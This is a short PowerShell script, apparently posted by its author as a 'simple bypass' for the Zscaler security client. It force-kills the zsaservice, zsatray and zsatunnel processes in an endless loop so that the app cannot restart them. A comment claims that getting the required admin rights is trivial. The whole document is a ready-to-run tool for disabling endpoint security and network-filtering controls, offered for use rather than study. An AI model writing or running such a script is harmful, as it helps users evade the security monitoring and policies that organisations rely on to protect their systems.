# Nothing fancy, just a simple bypass for the zscaler app. The app restarts these services as soon as they're killed 
# so a loop is required to keep the services down. The loop will run until you manualy kill it. Requires PS running with
# admin privs. Admin escalation should be trivial in most cases -Robert
 
for ($i=1; $i -le 10; $i){
$service = Get-WmiObject -Class Win32_Service -Filter "Name LIKE 'zsaservice'" | Select-Object -ExpandProperty ProcessId
$tray = Get-WmiObject -Class Win32_Service -Filter "Name LIKE 'zsatray'" | Select-Object -ExpandProperty ProcessId
$tunnel = Get-WmiObject -Class Win32_Service -Filter "Name LIKE 'zsatunnel'" | Select-Object -ExpandProperty ProcessId
taskkill /F /PID $service
taskkill /F /PID $tray
taskkill /F /PID $tunnel
}
